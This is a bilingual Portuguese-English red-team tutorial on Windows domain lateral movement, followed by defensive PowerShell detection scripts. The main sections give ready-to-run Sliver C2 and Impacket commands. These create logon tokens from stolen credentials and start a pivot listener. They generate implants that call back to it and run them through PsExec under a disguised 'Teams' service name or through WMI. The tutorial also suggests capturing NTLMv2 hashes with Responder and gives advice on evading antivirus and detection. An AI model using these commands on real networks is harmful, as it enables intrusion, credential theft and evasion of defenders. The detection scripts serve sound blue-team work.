2. Contexto e Relevância / Context and Relevance Original

O movimento lateral não é particularmente complicado por si só. A sua eficácia está diretamente ligada à profundidade do reconhecimento que fizeste antes. Quanto mais informado estiveres sobre a estrutura do domínio, mais estrategicamente podes espalhar-te, minimizando o ruído e evitando deteção precoce enquanto alcanças primeiro os sistemas mais valiosos. Começamos com técnicas disponíveis no Sliver C2 e depois passamos para métodos baseados em Impacket. A evasão de deteção também será discutida como parte do contexto operacional. Lateral movement is not particularly complicated on its own. Its effectiveness is directly tied to the depth of reconnaissance you performed earlier. The more informed you are about the structure of the domain, the more strategically you can spread, minimizing noise and avoiding early detection while reaching the most valuable systems first. We begin with techniques available in Sliver C2, then move to Impacket-based methods. Detection avoidance will also be discussed as part of the operational context.

3. Tokens — make-token Original

Depois de comprometer uma máquina inicial, o próximo passo comum é a extração de credenciais — seja por dump de hashes ou por Kerberoasting/AS-REP roasting. Eventualmente, obténs credenciais em texto claro. A partir daí, uma forma eficiente de usar essas credenciais é através de impersonação de token. After compromising an initial machine, the next common step is credential extraction — whether by dumping hashes or leveraging Kerberoasting/AS-REP roasting. Eventually, you end up with plaintext credentials. From there, one efficient way to use these credentials is through token impersonation.
A funcionalidade make-token do Sliver imita o comportamento das capacidades nativas de gestão de tokens do Windows. Cria uma nova sessão de logon com as credenciais fornecidas, permitindo agir como esse utilizador sobre a rede, mantendo a tua sessão original intacta localmente. Este modelo de identidade dupla é útil quando queres interagir com sistemas como um utilizador privilegiado sem mudar completamente de contexto. Sliver's make-token feature mimics the behavior of Windows' built-in token management capabilities. It creates a new logon session with the provided credentials, allowing you to act as that user over the network, while keeping your original session intact locally. This dual identity model is useful when you want to interact with systems as a privileged user without fully switching contexts.

3.1 Sintaxe / Syntax

sliver (session) > make-token -u admin -p password -d domain.ru

3.2 Testar acesso / Test access

sliver (session) > ls //DC.DOMAIN.RU/c$
Se listar ficheiros no domain controller funcionar, é provável que estejas autorizado a lê-los também. Uploads e downloads de ficheiros tornam-se possíveis nesta fase. Um truque: fazer upload de um atalho que aponta para um caminho de rede inexistente pode forçar o Windows a autenticar no teu listener se estiveres a correr o Responder — capturando hashes NTLMv2 para cracking offline. If listing files on the domain controller works, you are likely authorized to read them as well. File uploads and downloads also become possible at this stage. One trick: uploading a shortcut that links to a nonexistent network path can force Windows to authenticate to your listener if you're running Responder — capturing NTLMv2 hashes for offline cracking.
Nota / Note:
Usa FQDNs (nomes de domínio totalmente qualificados) sempre que possível — são mais fiáveis e esperados por muitas ferramentas por omissão. Use FQDNs (fully qualified domain names) wherever possible — they are more reliable and expected by many tools by default.

3.3 Logon Types Complementar

O make-token suporta diferentes tipos de logon. O mais relevante para movimento lateral é LOGON_NEW_CREDENTIALS (por omissão), que clona o token atual e usa as novas credenciais para conexões de saída. make-token supports different logon types. The most relevant for lateral movement is LOGON_NEW_CREDENTIALS (default), which clones the current token and uses the new credentials for outbound connections.

4. PsExec Pivot Original

Para estender o alcance do C2 na rede interna, precisas de estabelecer novas sessões ativas. É aqui que entra o pivoting. O pivoting permite aceder a máquinas que não estão diretamente ligadas à internet usando uma que já comprometeste como ponto de relay. To extend your C2 reach within the internal network, you need to establish new active sessions. This is where pivoting comes in. Pivoting allows you to access machines that are not directly connected to the internet by using one you have already compromised as a relay point.
A ferramenta PsExec do Impacket espelha a utilidade original da Sysinternals. Lança um processo remotamente na máquina alvo e permite interagir com ele. Embora os antivírus modernos tenham aprendido a detetar comportamento PsExec estilo Impacket, a ferramenta ainda oferece vantagens, especialmente a capacidade de autenticar usando um hash NTLM em vez de credenciais em texto claro. The PsExec tool in Impacket mirrors Microsoft's original Sysinternals utility. It remotely spawns a process on the target machine and lets you interact with it. While modern antivirus solutions have learned to detect Impacket-style PsExec behavior, the tool still offers advantages, especially the ability to authenticate using an NTLM hash instead of plaintext credentials.

4.1 Fluxo / Flow

# 1. Criar token (se ainda não fizeste)
sliver (session) > make-token -u admin -p password -d domain.ru

# 2. Iniciar pivot listener no host comprometido (porta 9898 por omissão)
sliver (session) > pivots tcp --bind 192.168.1.90

# 3. Gerar implante service que liga de volta ao listener
sliver (session) > generate --format service -i 192.168.1.90:9898 --skip-symbols -N psexec-pivot

# 4. Executar PsExec com nome de serviço credível
sliver (session) > psexec --custom-exe /root/payloads/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeams target.domain.ru
Se o sistema alvo não estiver protegido por antivírus ou ferramentas de deteção de endpoint, o payload executa com sucesso, dando-te uma shell SYSTEM. If the target system is unprotected by antivirus or endpoint detection tools, the payload executes successfully, giving you a SYSTEM-level shell.

5. WMI Pivot Original

O WMI (Windows Management Instrumentation) fornece aos administradores uma forma unificada de gerir máquinas locais e remotas. Da perspetiva de red team, o WMI é também um método nativo de execução remota de código, desde que tenhas direitos de administrador local. WMI (Windows Management Instrumentation) provides administrators with a unified way to manage both local and remote machines. From a red team perspective, WMI is also a native method for remote code execution, provided you have local admin rights.

5.1 Fluxo / Flow

# 1. Gerar implante para entrega via WMI (listener ainda ativo)
sliver (session) > generate -i 192.168.1.90:9898 --skip-symbols -N wmicpivot

# 2. Upload para o alvo (diretório menos inspecionado)
sliver (session) > cd //target.domain.ru/c$/windows/tasks
sliver (session) > upload wmicpivot.exe

# 3. Executar via WMI
sliver (session) > execute -o wmic /node:Target_IP /user:admin /password:password process call create "C:\\windows\\tasks\\wmicpivot.exe"
Se tudo estiver configurado corretamente, isto deve devolver uma sessão de nível SYSTEM através do pivot. If everything is configured correctly, this should return a SYSTEM-level session through the pivot.

6. Métodos Impacket Original

Se o WMI não estiver disponível, o PsExec continua a ser uma opção sólida, especialmente quando a porta SMB (445) está aberta: If WMI is unavailable, PsExec remains a solid option, especially when the SMB port (445) is open: 
c2 > proxychains4 psexec.py domain.ru/admin:password@target
Isto dá-te novamente uma shell de nível SYSTEM, assumindo credenciais adequadas e portas abertas. Recomendamos usar a utilidade original da Microsoft (Sysinternals) para evitar deteção. This again yields a SYSTEM-level shell, assuming proper credentials and open ports. We recommend using Microsoft's original Sysinternals utility to avoid detection.

7. OPSEC e Evasão Complementar

O Sliver PsExec coloca o binário com um nome aleatório em C:\Windows\Temp (monitorizado). Altera --service-name e --service-description para te misturares — o valor por omissão é "Sliver". Não uses o binário de serviço gerado pelo C2 se houver AV — é facilmente sinalizado. Sliver PsExec places the binary with a random name in C:\Windows\Temp (monitored). Change --service-name and --service-description to blend in — the default is "Sliver". Don't use the C2-generated service binary if AV is present — it's easily flagged.

8. Scripts de Impacto / Impact Scripts Impacto Complementar

Os scripts abaixo ajudam o blue team a detetar atividade compatível com Sliver Lateral Movement. The scripts below help the blue team detect Sliver Lateral Movement-compatible activity.

8.1 Script 14.1 — Deteção de Serviço "Sliver" / Sliver Service Detection

Objetivo: detetar criação de serviços com nome "Sliver" ou descrição "Sliver Implant" (evento 7045). Evidência: sliver-service-detect.csv. Goal: detect service creation with name "Sliver" or description "Sliver Implant" (event 7045). Evidence: sliver-service-detect.csv. 
# Script 14.1 - Sliver Service Detection
$out = ".\sliver-service-detect.csv"
$hits = @()
Get-WinEvent -LogName System -MaxEvents 1000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 7045 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $name = ($xml.Event.EventData.Data | Where-Object Name -eq "ServiceName").'#text'
    $desc = ($xml.Event.EventData.Data | Where-Object Name -eq "ServiceDescription").'#text'
    $img  = ($xml.Event.EventData.Data | Where-Object Name -eq "ImagePath").'#text'
    if ($name -match "Sliver" -or $desc -match "Sliver" -or $img -match "Temp.*\.exe") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Service=$name; Description=$desc; Image=$img }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Sliver service hits: $($hits.Count) -> $out" -ForegroundColor Red

8.2 Script 14.2 — Deteção de make-token / Token Impersonation Detection

Objetivo: detetar logons de rede (tipo 3) com credenciais explícitas (evento 4648) em sequência rápida — indicador de make-token. Evidência: token-impersonation.csv. Goal: detect network logons (type 3) with explicit credentials (event 4648) in quick succession — make-token indicator. Evidence: token-impersonation.csv. 
# Script 14.2 - Token Impersonation Detection
$out = ".\token-impersonation.csv"
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4648 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $user = ($xml.Event.EventData.Data | Where-Object Name -eq "TargetUserName").'#text'
    $target = ($xml.Event.EventData.Data | Where-Object Name -eq "TargetServerName").'#text'
    $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Account=$user; Target=$target }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Explicit credential logons: $($hits.Count) -> $out" -ForegroundColor Yellow

8.3 Script 14.3 — Deteção de Pivot TCP / TCP Pivot Detection

Objetivo: detetar conexões de saída na porta 9898 (predefinida do Sliver pivot) e processos que escutam nessa porta. Evidência: pivot-detect.csv. Goal: detect outbound connections on port 9898 (Sliver pivot default) and processes listening on that port. Evidence: pivot-detect.csv. 
# Script 14.3 - TCP Pivot Detection
$out = ".\pivot-detect.csv"
$hits = @()
# Listening on 9898
Get-NetTCPConnection -LocalPort 9898 -EA SilentlyContinue | ForEach-Object {
  $p = Get-Process -Id $_.OwningProcess -EA SilentlyContinue
  $hits += [PSCustomObject]@{ Type="Listen"; LocalPort=$_.LocalPort; PID=$_.OwningProcess; Process=$p.ProcessName }
}
# Outbound to 9898
Get-NetTCPConnection -RemotePort 9898 -EA SilentlyContinue | ForEach-Object {
  $p = Get-Process -Id $_.OwningProcess -EA SilentlyContinue
  $hits += [PSCustomObject]@{ Type="Outbound"; RemoteAddress=$_.RemoteAddress; RemotePort=$_.RemotePort; PID=$_.OwningProcess; Process=$p.ProcessName }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Pivot connections: $($hits.Count) -> $out" -ForegroundColor Red

8.4 Script 14.4 — Deteção de Serviço com Nome Credível mas Binário em Temp / Credible Service Name, Temp Binary

Objetivo: detetar serviços com nomes legítimos (Teams, Windows Update) mas cujo binário está em C:\Windows\Temp ou similar. Evidência: suspicious-services.csv. Goal: detect services with legitimate names (Teams, Windows Update) but whose binary is in C:\Windows\Temp or similar. Evidence: suspicious-services.csv. 
# Script 14.4 - Credible Service Name with Temp Binary
$out = ".\suspicious-services.csv"
$hits = @()
Get-CimInstance Win32_Service | Where-Object {
  $_.PathName -match "\\Temp\\" -and $_.Name -notmatch "^(Sliver|Temp)"
} | ForEach-Object {
  $hits += [PSCustomObject]@{ Name=$_.Name; DisplayName=$_.DisplayName; Path=$_.PathName; State=$_.State; StartMode=$_.StartMode }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Suspicious services: $($hits.Count) -> $out" -ForegroundColor Red
